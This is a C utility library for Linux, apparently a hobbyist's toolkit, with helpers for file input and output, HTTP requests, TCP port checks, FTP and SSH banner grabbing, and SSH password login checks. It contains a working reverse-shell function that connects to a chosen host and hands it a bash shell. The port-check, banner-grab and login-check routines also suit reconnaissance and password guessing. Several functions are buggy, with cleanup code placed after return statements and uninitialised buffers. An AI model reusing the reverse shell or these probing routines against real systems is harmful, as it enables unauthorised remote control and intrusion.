// Module For Linux System

#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <curl/curl.h>
#include <libssh/libssh.h>
#include "unam3d.h"

#define BUFFER_SIZE_DEFAULT 4096
char BUFFER_RESPONSE[BUFFER_SIZE_DEFAULT * 10000];
#define NULL_VAR_LINUX "/dev/null"
#define VAR_WRITE_HEADERS "/tmp/uha_headers.tmp"
#define VAR_WRITE_CONTENT "/tmp/uha_content.tmp"
//#define NULL_VAR_WINDOWS "NUL"

void hello_world(void){
    printf("Hello World ! By Unam3dd\n");
}

char * raw_input(char *input_string,int buffer){
    char input_console[buffer];
    char return_input[buffer];
    printf("%s",input_string);
    return fgets(input_console,buffer,stdin);
}

int input(char *input_string){
    int number;
    printf("%s",input_string);
    scanf("%d",&number);
    return number;
}

char *get_user(void){
    char *process=getenv("USER");
    if(process==NULL) return "[*] Error Get Username";
    return process;

}

void clear(void){
    system("clear");
}


int substring_in_string(char *substring,char *string){
    int c1 = 0;
    int c2 = 0;
    int i,y,fl;

    while (string[c1] != '\0'){
        c1++;
    }

    while (substring[c2] != '\0'){
        c2++;
    }

    for (i = 0; i <= c1 - c2; i++)
    {
        for (y = i; y < i + c2; y++){
            fl = 1;
            if (string[y] != substring[y - i]){
                fl = 0;
                break;
            }
        }

        if (fl == 1)
        {
            break;
        }
    }

    if (fl == 1){
        return 0;
    } else {
        return -1;
    }
}

void print(char *string){
    printf("%s\n",string);
}

int os_path_exists(const char *path)
{
    if (access(path, F_OK) != -1){
        return 0;
    } else {
        return -1;
    }
}

char *ftp_get_version(char *target_ip,int port)
{
    struct sockaddr_in so_variable;
    struct hostent *host_variable;
    struct in_addr *addr_variable;

    int error_socket, socks;

    strncpy((char*)&so_variable, "", sizeof(so_variable));

    so_variable.sin_family = AF_INET;
    so_variable.sin_addr.s_addr = inet_addr(target_ip);
    so_variable.sin_port = htons(port);

    socks = socket(AF_INET, SOCK_STREAM, 0);

    error_socket = connect(socks, (struct sockaddr*)&so_variable, sizeof(so_variable));
    
    if(error_socket < 0){
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"Error Recv Version By %s:%d",target_ip,port);
        return buffer_return;;
    }
    
    int data_recv;
    char buffer[BUFFER_SIZE_DEFAULT];
    data_recv = recv(socks,buffer,sizeof buffer - 1, 0);
    
    if(data_recv < 0){
        return "Error Recv Data !\n";
    }
    
    buffer[data_recv] = 0;
    char *p = strstr(buffer,"\r\n");
    
    if (p != NULL){
        *p = 0;
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"%s",buffer);
        return buffer_return;
    } else {
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"Error Recv Version By %s:%d",target_ip,port);
        return buffer_return;
    }
}

char *ssh_getserver_version(char *target_ip,int port)
{
    struct sockaddr_in so_variable;
    struct hostent *host_variable;
    struct in_addr *addr_variable;

    int error_socket, socks;

    strncpy((char*)&so_variable, "", sizeof(so_variable));

    so_variable.sin_family = AF_INET;
    so_variable.sin_addr.s_addr = inet_addr(target_ip);
    so_variable.sin_port = htons(port);

    socks = socket(AF_INET, SOCK_STREAM, 0);

    error_socket = connect(socks, (struct sockaddr*)&so_variable, sizeof(so_variable));
    
    if(error_socket < 0){
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"\033[31m[!] Error Recv Version By %s:%d",target_ip,port);
        return buffer_return;;
    }
    
    int data_recv;
    char buffer[BUFFER_SIZE_DEFAULT];
    data_recv = recv(socks,buffer,sizeof buffer - 1, 0);
    
    if(data_recv < 0){
        return "[*] Error Recv Data !\n";
    }
    
    buffer[data_recv] = 0;
    char *p = strstr(buffer,"\r\n");
    
    if (p != NULL){
        *p = 0;
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"%s",buffer);
        return buffer_return;
    } else {
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"\033[31m[!] Error Recv Version By %s:%d",target_ip,port);
        return buffer_return;
    }
}

void linux_reverse_shell(char *lhost,int port)
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(lhost);
    sa.sin_port = htons(port);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/bash", 0, 0);
}

int check_port_tcp(char *ip,int port)
{
    struct sockaddr_in s_var;

    int connection, socks;

    strncpy((char*)&s_var, "", sizeof(s_var));

    s_var.sin_family = AF_INET;
    s_var.sin_addr.s_addr = inet_addr(ip);
    s_var.sin_port = htons(port);

    socks = socket(AF_INET, SOCK_STREAM, 0);

    connection = connect(socks, (struct sockaddr *)&s_var, sizeof(s_var));
    if (connection == 0){
        return 0;
    } else {
        return -1;
    }

    close(socks);
}

char *file_read(char *filename,int buffer,char *mode)
{
    FILE *fileprocess;
    int check_path = os_path_exists(filename);
    if (check_path ==0){
        fileprocess = fopen(filename,mode);
        char *buffer_read = malloc(buffer);
        char buffer_read_char;
        char *buffer_save = malloc(buffer);
        char *buffer_save_sprintf = malloc(buffer);

        while ((buffer_read_char = fgetc(fileprocess)) != EOF){
            sprintf(buffer_save_sprintf,"%c",buffer_read_char);
            strcat(buffer_save,buffer_save_sprintf);
        }
        fclose(fileprocess);
        return buffer_save;
    } else {
        char *buffer_return = malloc(BUFFER_SIZE_DEFAULT);
        sprintf(buffer_return,"Error %s Not Found !\n",filename);
        return buffer_return;
    }
}

char *file_readlines(char *filename,char *mode)
{
    FILE *fp;
    char * line = NULL;
    size_t lenght_lines = 0;
    size_t read_lines;

    fp = fopen(filename,mode);

    if (fp == NULL){
        return "File Not Found !";
    }

    while ((read_lines = getline(&line,&lenght_lines, fp)) != -1){
        return line;
    }
}

char *file_readlines_n(char *filename,char *mode)
{
    FILE *fp;
    char * line = NULL;
    size_t lenght_lines = 0;
    size_t read_lines;

    fp = fopen(filename,mode);

    if (fp == NULL){
        return "File Not Found !";
    }

    while ((read_lines = getline(&line,&lenght_lines, fp)) != -1){
        char *split_line = strtok(line,"\n");
        return split_line;
    }
}


int file_write(char *filename,char *content,char *mode){
    FILE *fp;
    fp = fopen(filename,mode);
    fprintf(fp,"%s",content);
    fclose(fp);
    return 0;
}

int download_file(char *link,char *output_file)
{
    CURL *curl;
    FILE *fp;

    int results;

    fp = fopen(output_file,"wb");
    curl = curl_easy_init();
    curl_easy_setopt(curl,CURLOPT_URL, link);
    curl_easy_setopt(curl,CURLOPT_WRITEDATA,fp);
    results = curl_easy_perform(curl);
    if (results == CURLE_OK){
        return 0;
    } else {
        return -1;
    }
    fclose(fp);
    curl_easy_cleanup(curl);
}

int http_requests_status_code(char *link,int follow_location) // 0 = true; 1 = false
{
    CURL *curl;
    FILE *fp;
    fp = fopen(NULL_VAR_LINUX,"w");
    CURLcode results;

    if (follow_location ==0)
    {
        curl = curl_easy_init();
        if (curl){
            curl_easy_setopt(curl, CURLOPT_URL, link);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl,CURLOPT_WRITEDATA,fp);

            results = curl_easy_perform(curl);
        
            if (results == CURLE_OK){
                long response_code;
                curl_easy_getinfo(curl,CURLINFO_RESPONSE_CODE, &response_code);
                return response_code;
            }
        }
        fclose(fp);
        curl_easy_cleanup(curl);
    } else if (follow_location ==1)
    {
        curl = curl_easy_init();
        if (curl){
            curl_easy_setopt(curl, CURLOPT_URL, link);
            curl_easy_setopt(curl,CURLOPT_WRITEDATA,fp);

            results = curl_easy_perform(curl);
        
            if (results == CURLE_OK){
                long response_code;
                curl_easy_getinfo(curl,CURLINFO_RESPONSE_CODE, &response_code);
                return response_code;
            }
        }
        fclose(fp);
        curl_easy_cleanup(curl);
    }
}


char *http_requests(char *link,int follow_redirect)
{
    CURL *curl;
    FILE *fp_status_code, *fp_headers, *fp_content;
    fp_headers = fopen(VAR_WRITE_HEADERS,"w");
    fp_content = fopen(VAR_WRITE_CONTENT,"w");
    CURLcode results;

    if (follow_redirect ==0)
    {
        curl = curl_easy_init();
        if (curl){
            curl_easy_setopt(curl, CURLOPT_URL, link);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl,CURLOPT_WRITEDATA,fp_content);
            curl_easy_setopt(curl,CURLOPT_WRITEHEADER,fp_headers);

            results = curl_easy_perform(curl);
        
            if (results == CURLE_OK)
            {
                fclose(fp_content);
                fclose(fp_headers);
                char *headers_file = file_read(VAR_WRITE_HEADERS,65556,"r");
                char *content_file = file_read(VAR_WRITE_CONTENT,65556,"r");
                strcat(BUFFER_RESPONSE,headers_file);
                strcat(BUFFER_RESPONSE,"\n");
                strcat(BUFFER_RESPONSE,content_file);
                strcat(BUFFER_RESPONSE,"\n");
                return BUFFER_RESPONSE;
                remove(VAR_WRITE_CONTENT);
                remove(VAR_WRITE_HEADERS);
            }
        }
        curl_easy_cleanup(curl);
    } else if (follow_redirect ==1)
    {
        curl = curl_easy_init();
        if (curl){
            curl_easy_setopt(curl, CURLOPT_URL, link);
            curl_easy_setopt(curl,CURLOPT_WRITEDATA,fp_content);
            curl_easy_setopt(curl,CURLOPT_WRITEHEADER,fp_headers);

            results = curl_easy_perform(curl);
        
            if (results == CURLE_OK)
            {
                fclose(fp_content);
                fclose(fp_headers);
                char *headers_file = file_read(VAR_WRITE_HEADERS,65556,"r");
                char *content_file = file_read(VAR_WRITE_CONTENT,65556,"r");
                strcat(BUFFER_RESPONSE,headers_file);
                strcat(BUFFER_RESPONSE,"\n");
                strcat(BUFFER_RESPONSE,content_file);
                strcat(BUFFER_RESPONSE,"\n");
                return BUFFER_RESPONSE;
                remove(VAR_WRITE_CONTENT);
                remove(VAR_WRITE_HEADERS);
            }
        }
        curl_easy_cleanup(curl);
    }
}


int ssh_login(char *ip,int port,char *username,char *password)
{
    ssh_session session;

    int ssh_s;
    char buffer[BUFFER_SIZE_DEFAULT];
    unsigned int bytes;
    session = ssh_new();
    if (session == NULL) return -1;
    ssh_options_set(session,SSH_OPTIONS_HOST,ip);
    ssh_options_set(session,SSH_OPTIONS_PORT,&port);
    ssh_options_set(session,SSH_OPTIONS_USER,username);
    ssh_s = ssh_connect(session);
    if (ssh_s != SSH_OK) return 1;
    ssh_s = ssh_userauth_password(session,NULL,password);
    if (ssh_s != SSH_AUTH_SUCCESS) return 2;
    ssh_disconnect(session);
    ssh_free(session);
    return 0;
}